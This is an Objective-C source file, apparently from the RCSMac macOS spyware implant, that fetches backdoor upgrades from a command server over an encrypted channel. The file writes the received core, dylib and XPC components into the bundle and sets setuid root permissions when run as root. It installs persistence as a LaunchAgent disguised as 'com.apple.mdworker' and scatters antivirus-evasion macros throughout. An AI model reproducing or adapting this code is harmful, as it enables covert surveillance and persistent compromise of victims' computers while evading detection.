/*
 *  UpgradeNetworkOperation.m
 *  RCSMac
 *
 *
 *  Created by revenge on 2/3/11.
 *  Copyright (C) HT srl 2011. All rights reserved
 *
 */

#import "UpgradeNetworkOperation.h"
#import "NSMutableData+AES128.h"
#import "NSString+SHA1.h"
#import "NSData+SHA1.h"
#import "NSData+Pascal.h"
#import "RCSMCommon.h"

#import "RCSMLogger.h"
#import "RCSMDebug.h"

#define CORE_UPGRADE  @"core"
#define DYLIB_UPGRADE @"inputmanager"
#define KEXT_UPGRADE  @"driver"

#import "RCSMAVGarbage.h"

@interface UpgradeNetworkOperation (private)

- (BOOL)_updateFilesForCoreUpgrade: (NSString *)upgradePath;

@end

@implementation UpgradeNetworkOperation (private)

- (BOOL)_updateFilesForCoreUpgrade: (NSString *)upgradePath
{
  BOOL success = NO;
  u_long permissions;
  
  // AV evasion: only on release build
  AV_GARBAGE_008
  
  // FIXED-
  if (getuid() == 0 || geteuid() == 0)
    permissions  = (S_ISUID | S_IRWXU | S_IRGRP | S_IXGRP | S_IROTH | S_IXOTH);
  else
    permissions  = (S_IRWXU | S_IRGRP | S_IXGRP | S_IROTH | S_IXOTH);
  
  // AV evasion: only on release build
  AV_GARBAGE_007
  
  NSValue *permission = [NSNumber numberWithUnsignedLong: permissions];
  NSValue *owner      = [NSNumber numberWithInt: 0];
  
  // AV evasion: only on release build
  AV_GARBAGE_006
  
  NSDictionary *tempDictionary = [NSDictionary dictionaryWithObjectsAndKeys:
                                  permission,
                                  NSFilePosixPermissions,
                                  owner,
                                  NSFileOwnerAccountID,
                                  nil];
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  success = [[NSFileManager defaultManager] setAttributes: tempDictionary
                                             ofItemAtPath: upgradePath
                                                    error: nil];
  
  // AV evasion: only on release build
  AV_GARBAGE_005
  
  if (success == NO)
      return success;  
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  // Once the backdoor has been written, edit the backdoor Loader in order to
  // load the new updated backdoor upon reboot/login
  NSString *backdoorLaunchAgent = [[NSString alloc] initWithFormat: @"%@/%@",
                                   NSHomeDirectory(),
                                   BACKDOOR_DAEMON_PLIST];
  
  // AV evasion: only on release build
  AV_GARBAGE_004
  
  NSError *error = nil;
  if ([[NSFileManager defaultManager] removeItemAtPath: backdoorLaunchAgent
                                                 error: &error] == NO)
    {
#ifdef DEBUG_UP_NOP
      errorLog(@"Error while removing LaunchAgent file, reason: %@", [error localizedDescription]);
#endif
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  [backdoorLaunchAgent release];
  
  success = [gUtil createLaunchAgentPlist: @"com.apple.mdworker"
                                forBinary: gBackdoorUpdateName];
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  if (success == NO)
    {
#ifdef DEBUG_UP_NOP
      errorLog(@"Error while writing backdoor launchAgent plist");
#endif
    }
  else
    {
#ifdef DEBUG_UP_NOP
      infoLog(@"LaunchAgent file updated");
#endif
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  return YES;
}

@end


@implementation UpgradeNetworkOperation

- (id)initWithTransport: (RESTTransport *)aTransport
{
  if ((self = [super init]))
    {
      mTransport = aTransport;
      
      // AV evasion: only on release build
      AV_GARBAGE_000
      
      return self;
    }
  
  return nil;
}

- (void)dealloc
{
  [super dealloc];
}

- (BOOL)perform
{
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  uint32_t command              = PROTO_UPGRADE;
  NSAutoreleasePool *outerPool  = [[NSAutoreleasePool alloc] init];
  NSMutableData *commandData    = [[NSMutableData alloc] initWithBytes: &command
                                                                length: sizeof(uint32_t)];
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  NSData *commandSha            = [commandData sha1Hash];
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  [commandData appendData: commandSha];
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
#ifdef DEBUG_UPGRADE_NOP
  infoLog(@"commandData: %@", commandData);
#endif
  
  [commandData encryptWithKey: gSessionKey];
  
  // AV evasion: only on release build
  AV_GARBAGE_009
  
  //
  // Send encrypted message
  //
  NSURLResponse *urlResponse    = nil;
  NSData *replyData             = nil;
  NSMutableData *replyDecrypted = nil;
  
  // AV evasion: only on release build
  AV_GARBAGE_008
  
  replyData = [mTransport sendData: commandData
                 returningResponse: urlResponse];
  
  // AV evasion: only on release build
  AV_GARBAGE_007
  
  if (replyData == nil)
    {
      // AV evasion: only on release build
      AV_GARBAGE_006
     
      [commandData release];
      [outerPool release];
      
      return NO;
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_005
  
  replyDecrypted = [[NSMutableData alloc] initWithData: replyData];
  
  // AV evasion: only on release build
  AV_GARBAGE_004
  
  [replyDecrypted decryptWithKey: gSessionKey];
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  [replyDecrypted getBytes: &command
                    length: sizeof(uint32_t)];
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  // remove padding
  [replyDecrypted removePadding];
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  //
  // check integrity
  //
  NSData *shaRemote;
  NSData *shaLocal;
  
  @try
    {
      // AV evasion: only on release build
      AV_GARBAGE_003
    
      shaRemote = [replyDecrypted subdataWithRange:
                   NSMakeRange([replyDecrypted length] - CC_SHA1_DIGEST_LENGTH,
                               CC_SHA1_DIGEST_LENGTH)];
      
      // AV evasion: only on release build
      AV_GARBAGE_000
      
      shaLocal = [replyDecrypted subdataWithRange:
                  NSMakeRange(0, [replyDecrypted length] - CC_SHA1_DIGEST_LENGTH)];
      
      // AV evasion: only on release build
      AV_GARBAGE_001
    }
  @catch (NSException *e)
    {  
      // AV evasion: only on release build
      AV_GARBAGE_000
      
      [replyDecrypted release];
      [commandData release];
      [outerPool release];
      
      // AV evasion: only on release build
      AV_GARBAGE_002
      
      return NO;
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_006
  
  shaLocal = [shaLocal sha1Hash];
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  if ([shaRemote isEqualToData: shaLocal] == NO)
    {     
      // AV evasion: only on release build
      AV_GARBAGE_000
    
      [replyDecrypted release];
      [commandData release];
      [outerPool release];
      
      // AV evasion: only on release build
      AV_GARBAGE_002
      
      return NO;
    }
  
  if (command != PROTO_OK)
    {    
      // AV evasion: only on release build
      AV_GARBAGE_003
    
      [replyDecrypted release];
      [commandData release];
      [outerPool release];
      
      return NO;
    }
  
  uint32_t packetSize     = 0;
  uint32_t numOfFilesLeft = 0;
  uint32_t filenameSize   = 0;
  uint32_t fileSize       = 0;
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  @try
    {
      // AV evasion: only on release build
      AV_GARBAGE_009
     
      [replyDecrypted getBytes: &packetSize
                         range: NSMakeRange(4, sizeof(uint32_t))];
      
      // AV evasion: only on release build
      AV_GARBAGE_000
      
      [replyDecrypted getBytes: &numOfFilesLeft
                         range: NSMakeRange(8, sizeof(uint32_t))];
      
      // AV evasion: only on release build
      AV_GARBAGE_001
  
      [replyDecrypted getBytes: &filenameSize
                         range: NSMakeRange(12, sizeof(uint32_t))];
      
      // AV evasion: only on release build
      AV_GARBAGE_002
      
      [replyDecrypted getBytes: &fileSize
                         range: NSMakeRange(16 + filenameSize, sizeof(uint32_t))];
      
      // AV evasion: only on release build
      AV_GARBAGE_000
      
    }
  @catch (NSException *e)
    {
      // AV evasion: only on release build
      AV_GARBAGE_003
    
      [replyDecrypted release];
      [commandData release];
      [outerPool release];
      
      // AV evasion: only on release build
      AV_GARBAGE_005
      
      return NO;
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  NSData *stringData;
  NSData *fileContent;
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  @try
    { 
      // AV evasion: only on release build
      AV_GARBAGE_002
      
      stringData  = [[NSData alloc] initWithData:
                     [replyDecrypted subdataWithRange: NSMakeRange(12, filenameSize + 4)]];
      
      // AV evasion: only on release build
      AV_GARBAGE_005
      
      fileContent = [[NSData alloc] initWithData:
                     [replyDecrypted subdataWithRange: NSMakeRange(16 + filenameSize + 4, fileSize)]];
    }
  @catch (NSException *e)
    {   
      // AV evasion: only on release build
      AV_GARBAGE_000
    
      [replyDecrypted release];
      [commandData release];
      [outerPool release];
      
      // AV evasion: only on release build
      AV_GARBAGE_004
      
      return NO;
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_006
  
  NSString *filename  = [stringData unpascalizeToStringWithEncoding: NSUTF16LittleEndianStringEncoding];
  
  // AV evasion: only on release build
  AV_GARBAGE_007
  
#define XPC_UPGRADE @"xpc" 

  if (filename == nil)
    {
#ifdef DEBUG_UPGRADE_NOP
      errorLog(@"filename is empty, error on unpascalize");
#endif
    }
  else
    {
      // AV evasion: only on release build
      AV_GARBAGE_002
      
      if ([filename isEqualToString: CORE_UPGRADE])
        {
          // AV evasion: only on release build
          AV_GARBAGE_001
          
          NSString *_upgradePath = [[NSString alloc] initWithFormat: @"%@/%@",
                                    [[NSBundle mainBundle] bundlePath],
                                    gBackdoorUpdateName];
          
          // AV evasion: only on release build
          AV_GARBAGE_003
          
          [fileContent writeToFile: _upgradePath
                        atomically: YES];
          
          if ([self _updateFilesForCoreUpgrade: _upgradePath] == NO)
            {
#ifdef DEBUG_UPGRADE_NOP
              errorLog(@"Error while updating files for core upgrade");
#endif
            }
          
          // AV evasion: only on release build
          AV_GARBAGE_003
          
          [_upgradePath release];
        }
      else if ([filename isEqualToString: DYLIB_UPGRADE])
        {
          // AV evasion: only on release build
          AV_GARBAGE_006
          
          // FIXED-
          NSString *_upgradePath = [[NSString alloc] initWithFormat: @"%@/%@",
                                    [[NSBundle mainBundle] bundlePath],
                                    RCS8_UPDATE_DYLIB];
          
          // AV evasion: only on release build
          AV_GARBAGE_007
          
          [[NSFileManager defaultManager] removeItemAtPath: _upgradePath
                                                     error: nil];
          
          // AV evasion: only on release build
          AV_GARBAGE_000
          
          // And write it back
          [fileContent writeToFile: _upgradePath
                        atomically: YES];
          
          // AV evasion: only on release build
          AV_GARBAGE_004
          
          [_upgradePath release];
          
          // AV evasion: only on release build
          AV_GARBAGE_003
          
        }
      else if ([filename isEqualToString: XPC_UPGRADE])
        {
          // AV evasion: only on release build
          AV_GARBAGE_007
          
          // FIXED-
          NSString *_upgradePath = [[NSString alloc] initWithFormat: @"%@/%@",
                                    [[NSBundle mainBundle] bundlePath],
                                    RCS8_UPDATE_XPC];
          
          // AV evasion: only on release build
          AV_GARBAGE_008
          
          [[NSFileManager defaultManager] removeItemAtPath: _upgradePath
                                                     error: nil];
          
          // AV evasion: only on release build
          AV_GARBAGE_009
          
          // And write it back
          [fileContent writeToFile: _upgradePath
                        atomically: YES];
          
          // AV evasion: only on release build
          AV_GARBAGE_000
          
          [_upgradePath release];
        }
      else if ([filename isEqualToString: KEXT_UPGRADE])
        {          
          // TODO: Update kext binary inside Resources subfolder
        }
      else
        {
#ifdef DEBUG_UPGRADE_NOP
          errorLog(@"Upgrade not supported (%@)", filename);
#endif
        }
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  [fileContent release];
  [stringData release];
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  [replyDecrypted release];
  [commandData release];
  [outerPool release];
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  //
  // Get files until there's no one left
  //
  if (numOfFilesLeft != 0)
    {
      // AV evasion: only on release build
      AV_GARBAGE_003
    
      return [self perform];
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_004
  
  return YES;
}

@end
